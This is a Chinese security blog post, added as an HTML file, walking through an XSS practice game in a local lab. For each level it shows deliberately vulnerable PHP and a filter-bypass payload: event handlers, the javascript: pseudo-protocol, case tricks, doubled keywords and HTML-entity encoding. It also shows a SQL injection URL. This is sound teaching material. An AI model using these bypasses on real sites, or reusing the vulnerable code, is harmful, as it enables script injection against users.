@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XSS," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS 学习小游戏。">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Game -1">
+<meta property="og:url" content="http://yoursite.com/2017/11/17/XSS_Game/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="XSS 学习小游戏。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-7/89413805.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-7/13048970.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-7/56538391.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-7/19266749.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-7/7107866.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-9/33659671.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-9/34910933.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-9/72053490.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-9/28775489.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-9/34570117.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-15/91824142.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-15/44878964.jpg">
+<meta property="og:updated_time" content="2018-01-15T08:08:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS Game -1">
+<meta name="twitter:description" content="XSS 学习小游戏。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//17-11-7/89413805.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/11/17/XSS_Game/"/>
+
+
+
+
+
+  <title>XSS Game -1 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/17/XSS_Game/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS Game -1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-17T13:20:46+08:00">
+                2017-11-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>XSS 学习小游戏。</p>
+<a id="more"></a>
+<p><strong>1关</strong></p>
+<p>代码如下</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;
+</code></pre><p>参数<code>name</code>没有任何的过滤，直接输出了。</p>
+<pre><code>http://127.0.0.1:8000/xssgame/level1.php?name=&lt;img src=&apos;1&apos; onerror=confirm(1)&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-7/89413805.jpg" alt=""></p>
+<p>源码内容</p>
+<pre><code>&lt;h2 align=center&gt;欢迎用户&lt;img src=&apos;1&apos; onerror=confirm(1)&gt;
+</code></pre><p><a href="https://www.w3schools.com/jsref/event_onerror.asp" target="_blank" rel="noopener"><code>onerror</code>事件</a></p>
+<pre><code>onerror 事件会在文档或图像加载过程中发生错误时被触发。
+</code></pre><p><strong>2关</strong></p>
+<p>代码。。搜索型<code>xss</code></p>
+<p>参数<code>keyword</code>取得的值，直接在<code>&lt;input&gt;</code>里面输出了，然后再传递给<code>htmlspecialchars</code></p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;
+&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+</code></pre><p>看到，输入的内容，被<code>htmlspecialchars</code>转义后输出的。</p>
+<p>对于这样的<code>XSS</code>漏洞点，通常会使用<code>htmlspecialchars</code>函数过滤输入。</p>
+<p>将特殊字符转换为<code>HTML</code>实体。只转换5种特殊字符。<code>&amp; &quot; &#39; &gt; &lt;</code></p>
+<pre><code>字符    替换后
+&amp; (&amp; 符号)    &amp;amp;
+&quot; (双引号)    &amp;quot;，除非设置了 ENT_NOQUOTES
+&apos; (单引号)    设置了 ENT_QUOTES 后， &amp;#039; (如果是 ENT_HTML401) ，或者 &amp;apos; (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。
+&lt; (小于)    &amp;lt;
+&gt; (大于)    &amp;gt;
+</code></pre><p>是在<code>&lt;input&gt;</code>里面输入的内容，需要考虑，闭合<code>&lt;input&gt;</code>标签。</p>
+<pre><code>http://127.0.0.1:8000/xssgame/level2.php?keyword=&quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;
+</code></pre><p>源码</p>
+<pre><code>&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&quot;&gt;
+</code></pre><p><code>&lt;input&gt;</code>中的<code>value</code>代表输入的值。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-7/13048970.jpg" alt=""></p>
+<p>之前在思考一个参数点，会不会这样，即存在注入又存在XSS。好像会这样的。就像第二关这个参数的值会显示在前端，如果还会进入数据库进行查询。但是登录的时候，数据一般是在<code>&lt;input&gt;</code>里面进行输出显示的。</p>
+<p>遇到了一个问题，是在用户登录处存在xss漏洞。</p>
+<p><strong>SQL&amp;XSS</strong></p>
+<pre><code>&lt;?php
+header(&quot;Content-type:text/html;charset=utf-8&quot;);
+$id = $_GET[&apos;id&apos;];
+$conn = mysqli_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;,&apos;waf&apos;);
+if(!$conn){
+    die(&apos;Could not connect the database&apos;);
+}
+//获取get参数数据
+$id = $_GET[&apos;id&apos;];
+//未经过滤，直接进数据查询
+$sql = &apos;select * from news where id=&apos;.$id;
+$result = mysqli_query($conn,$sql);
+$row = mysqli_fetch_array($result);
+echo $row[&apos;id&apos;];
+echo &apos;&lt;br/&gt;&apos;;
+echo $row[&apos;title&apos;];
+echo &apos;&lt;hr/&gt;&apos;;
+echo $sql;
+mysqli_close($conn);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($id).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
+&lt;form action=test2.php method=GET&gt;
+用户名
+&lt;input name=id  value=&quot;&apos;.$id.&apos;&quot;&gt;
+&lt;input type=submit name=submit value=&quot;提交&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+</code></pre><p>可以看到<code>$id</code>参数传入数据库里面进行了数据的查询，还将其传入到了<code>&lt;input&gt;</code>里面进行输出。</p>
+<p>sql注入结果</p>
+<pre><code>http://127.0.0.1:8000/waf/test2.php?id=-1+union+select+1%2Cuser%28%29%2C3&amp;submit=%E6%8F%90%E4%BA%A4
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-7/56538391.jpg" alt=""></p>
+<p>XSS结果</p>
+<pre><code>http://127.0.0.1:8000/waf/test2.php?id=&quot;&gt;&lt;script&gt;alert(&apos;+I+am+xss&apos;)&lt;/script&gt;&amp;submit=æäº¤
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-7/19266749.jpg" alt=""></p>
+<p>所以以上思考的问题是存在的，触发的时候，一个参数触发不同漏洞的时候，其中的<code>payload</code>不同，以后测试的时候，需要对参数进行多方漏洞的测试。</p>
+<p><strong>3关</strong></p>
+<p>这一次，把在<code>&lt;input&gt;</code>里面的内容进行了<code>htmlspecialchars</code>转义。这次再用第二关的<code>payload</code>，试试，就不行了。如何绕过<code>htmlspecialchars</code>的转义，使用不含有其转义字符的<code>payload</code>，反单引号是其中的一个。</p>
+<p>代码</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&quot;;
+?&gt;
+</code></pre><p>这个时候<code>input</code>的<code>payload</code>就被转义了。</p>
+<pre><code>&lt;input name=keyword  value=&apos;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&apos;&gt;
+</code></pre><p>既然这五个字符已经被转义了，考虑使用其他的不带有这几个特殊字符的<code>payload</code>。</p>
+<p>那就使用<code>javascript</code>事件函数。</p>
+<p>鼠标移动事件</p>
+<pre><code>http://127.0.0.1:8000/xssgame/level3.php?keyword=&apos;+onmouseover=confirm(1)
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-7/7107866.jpg" alt=""></p>
+<p>源码中可知</p>
+<pre><code>&lt;input name=keyword  value=&apos;&apos; onmouseover=confirm(1) //&apos;&gt;
+</code></pre><p>其中的<code>//</code>注释掉后面的<code>&#39;</code>。</p>
+<p><code>htmlspecialchars</code>不对反单引号转义的。</p>
+<pre><code>&apos; onmouseover=confirm(`xss`) \\
+</code></pre><p><a href="http://www.w3school.com.cn/jsref/jsref_events.asp" target="_blank" rel="noopener">JavaScript 事件参考手册</a></p>
+<p>事件通常与函数配合使用，这样就可以通过发生的事件来驱动函数执行。</p>
+<p><strong>4关</strong></p>
+<p>从第四关开始，就会有一些特殊字符的过滤了。现在考虑过滤了那些字符，以及如何进行绕过。</p>
+<p>其中的源码如下。</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+</code></pre><p>从其中可以看到，<code>&lt;，&gt;</code>，两个尖括号被过滤了。如何绕过？</p>
+<p>和第三关一样，使用不带有被过滤字符的<code>payload</code>。</p>
+<pre><code>&quot; onmouseover=confirm(1)//
+</code></pre><p>关于绕过过滤字符的一个很好的案例，可以学习一下。</p>
+<p><a href="https://www.secpulse.com/archives/47696.html" target="_blank" rel="noopener">搜狐视频储存型XSS（过滤了尖括号/圆括号/单引号等字符下的利用技巧）</a></p>
+<p><strong>5关</strong></p>
+<p>这一次将输入的<code>payload</code>进行了替换。比如输入<code>script</code>替换为了<code>sc_ript</code>。</p>
+<p>看具体的代码如下。</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;    
+</code></pre><p>再使用<code>on</code>事件就不行了。比如以下的载荷。</p>
+<pre><code>keyword=&quot;+onmouseover=alert(1)+//
+</code></pre><p>传入到<code>&lt;input&gt;</code>里面的值，被改变了。</p>
+<pre><code>&lt;input name=keyword  value=&quot;&quot; o_nmouseover=alert(1) //&quot;&gt;
+</code></pre><p>那就使用不是<code>on</code>事件和不带有<code>script</code>的载荷</p>
+<p><code>str_replace</code>不区分大写的问题。<code>str_ireplace()</code>区分大小写。</p>
+<p>测试替换函数</p>
+<pre><code>&lt;?php
+$id = $_GET[&apos;id&apos;];
+$c = str_replace(&apos;script&apos;,&apos;s_cript&apos;,$id);
+echo $c;
+echo &apos;&lt;br&gt;&apos;;
+$ii = $_GET[&apos;ii&apos;];
+$d = str_ireplace(&apos;script&apos;,&apos;s_cript&apos;,$ii);
+echo $d;
+</code></pre><p>结果</p>
+<pre><code>http://127.0.0.1:8000/xssgame/strplace.php?id=sCript&amp;ii=sCript
+sCript
+s_cript
+</code></pre><p>第五关虽然没有使用区分大小写的替换函数，但是在取值的时候，直接小写转换了。</p>
+<pre><code>$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+</code></pre><p>使用其他的<code>payload</code>，不带有<code>script</code>和<code>on</code>关键字的。</p>
+<p>使用<a href="http://zlzxy.com/javascript/1370.html" target="_blank" rel="noopener">javascript伪协议</a>。</p>
+<p>使用<code>&lt;a&gt;</code>标签，其中的<code>&quot;&gt;&lt;&quot;</code>是为了闭合<code>&lt;input&gt;</code></p>
+<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;Clickme&lt;/a&gt;&lt;&quot; 
+</code></pre><p>点击其中的<code>Clickme</code>就可以弹窗了。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-9/33659671.jpg" alt=""></p>
+<pre><code>123456&quot;&gt;&lt;iframe src=javascript:alert(document.domain)&gt;
+&lt;input name=keyword  value=&quot;123456&quot;&gt;&lt;iframe src=javascript:alert(document.domain)&gt;&quot;&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-9/34910933.jpg" alt=""></p>
+<p><strong>6关</strong></p>
+<p>通过源码，可以看到，过滤了更多，但是没有区分大小写。</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+</code></pre><p>使用包含一个大写的<code>payload</code>就可以。</p>
+<pre><code>123456&quot;&gt;&lt;iframe src=javascript:alert(document.domain)&gt;
+&lt;input name=keyword  value=&quot;123456&quot;&gt;&lt;iframe Src=javascript:alert(document.domain)&gt;&quot;&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-9/72053490.jpg" alt=""></p>
+<p><strong>7关</strong></p>
+<p>这次是区分了大小写，使用了过滤。两种过滤手段，一是对输入的敏感内容，进行重新的替换，混乱其<code>payload</code>，类似于5，6关的，将<code>&lt;script</code>变换为<code>&lt;sc_ript</code>。这一种感觉很好，想绕过就得使用不含有过滤字符的<code>payload</code>。接下来，这种是将敏感内容替换为空。如何绕过呢？</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str =strtolower( $_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+</code></pre><p><code>script</code>–&gt;<code></code>，那<code>scscriptript</code>–&gt;<code>script</code></p>
+<pre><code>&quot;&gt;&lt;scscriptript&gt;coonnfirm(1)&lt;/scscriptript&gt;&lt;&quot;
+&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&lt;&quot;&quot;&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-9/28775489.jpg" alt=""></p>
+<p>遇到这种情况，需要查看源码，看看那些被过滤了。根据输出的内容来判断，一步步的尝试。</p>
+<p>比如输入<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</code></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-9/34570117.jpg" alt=""></p>
+<p><strong>8关</strong></p>
+<p>源码</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);
+echo &apos;&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+&lt;?php
+ echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;
+?&gt;
+</code></pre><p>这次的过滤就是破环输入的<code>payload</code>了。使用<code>javascript</code>伪协议，但是其中被<code>htmlspecialchars</code>转义了。使用伪协议和不带有五种特殊字符的载荷。</p>
+<p>输出点在哪里。在友情链接处。</p>
+<p>这个过滤了很多的内容，需要考虑用编码绕过。</p>
+<p><strong>html实体编码绕过</strong></p>
+<p><a href="http://www.howtocreate.co.uk/sidehtmlentity.html" target="_blank" rel="noopener">HTML实体引用</a></p>
+<pre><code>    十进制    十六进制
+t    &amp;#116;    &amp;#x74;
+</code></pre><p>payload</p>
+<pre><code>javascrip&amp;#x74;:alert(document.domain)
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#x74;:aler&amp;#x74;(document.domain)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+</code></pre><p>这种编码，<code>WAF</code>没有拦截。</p>
+<pre><code>192.168.86.208/?id=javascrip&amp;#116;:aler&amp;#x74;(document.domain)
+</code></pre><p><strong>疑问</strong></p>
+<pre><code>&lt;?php
+$a = $_GET[&apos;a&apos;];
+echo ($a);
+?&gt;
+</code></pre><p>使用<code>html</code>实体测试这个的时候，没有成功，无弹窗。是输出点不一样吗，考虑是输出位置的原因吗？</p>
+<pre><code>t    &amp;#116;    &amp;#x74;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-15/91824142.jpg" alt=""></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-11-15/44878964.jpg" alt=""></p>
+<p><strong>9关</strong></p>
+<p>源码 </p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);
+echo &apos;&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+&lt;?php
+if(false===strpos($str7,&apos;http://&apos;))
+{
+  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;
+        }
+else
+{
+  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;
+}
+?&gt;
+</code></pre><p>这个比8关多了一个判断，strpos — 查找字符串首次出现的位置。</p>
+<p>多在后面加个 <code>//http://www.sec-note.com</code>，让判断为真。</p>
+<pre><code>javascrip&amp;#x74;:alert(document.domain)//http://sec-note.com 
+</code></pre><p><strong>10关</strong></p>
+<p>源码。可以看到将存在的<code>xss</code>点隐藏了，需要点击源码查看，存在的可控点。</p>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&apos;;
+?&gt;
+&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+</code></pre><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="http://blog.csdn.net/cherrie007/article/details/77340301" target="_blank" rel="noopener">http://blog.csdn.net/cherrie007/article/details/77340301</a></p>
+<p><a href="https://www.secpulse.com/archives/59497.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/59497.html</a></p>
+<p><a href="http://www.freebuf.com/articles/web/40520.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/40520.html</a></p>
+<p><a href="http://www.cnblogs.com/song-song/p/5277838.html" target="_blank" rel="noopener">A标签使用javascript:伪协议</a></p>
+<p><a href="http://zlzxy.com/javascript/1370.html" target="_blank" rel="noopener">javascript伪协议</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
